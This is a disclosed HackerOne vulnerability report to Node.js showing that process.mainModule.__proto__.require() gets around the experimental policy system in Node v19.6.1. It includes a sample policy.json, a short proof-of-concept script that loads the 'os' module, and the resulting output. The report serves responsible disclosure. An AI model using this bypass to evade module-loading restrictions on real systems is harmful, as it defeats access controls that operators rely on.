# The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1

## Report Details
- **Report ID**: 1877919
- **URL**: https://hackerone.com/reports/1877919
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-02-17T17:58:20.197Z
- **Disclosed**: 2023-07-20T20:55:30.392Z

## Reporter
- **Username**: haxatron1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
process.mainModule.require() correctly works with permission system in Node v19.6.1. 
But the use of \_\_proto\_\_  in process.mainModule.\_\_proto\_\_.require() can bypass the check.

# Description and STR
Consider the following policy.json:
`````
{
  "resources": {
    "./proc.js": {
      "integrity": true
    }
  }
}
`````
The policy only allows proc.js file to be loaded without any dependencies.

However with the following proc.js
`````
const os = process.mainModule.__proto__.require("os")

console.log(process.version)
console.log(os.version())
`````
We get the output:
`````
└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
v19.6.1
#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
(node:2720) ExperimentalWarning: Policies are experimental.
(Use `node --trace-warnings ...` to show where the warning was created)
`````
Therefore os dependency can be loaded and os.version executed even if unspecified in permission system.

## Impact

Bypass the permission system

## Attachments
No attachments
